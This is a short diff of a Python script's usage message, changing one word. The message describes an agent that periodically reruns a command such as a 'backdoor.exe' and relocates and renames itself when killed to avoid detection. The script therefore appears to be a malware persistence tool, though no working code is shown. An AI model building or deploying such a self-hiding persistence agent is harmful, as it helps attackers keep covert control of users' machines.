@@ -13,7 +13,7 @@ def get_arguments():
     if len(sys.argv) < 2:
         print("Use this script to create a tiny agent that will periodically rerun your cmd command "
               "with a specified sleep timer. In case the agent has been killed," 
-              "it will rewrite itself before dying to a new place with a new filename to avoid detection from the user.")
+              "it would rewrite itself before dying to a new place with a new filename to avoid detection from the user.")
         print("Usage: " + sys.argv[0] + " 30 " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
         print("Usage: " + sys.argv[0] + " " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
         sys.exit()
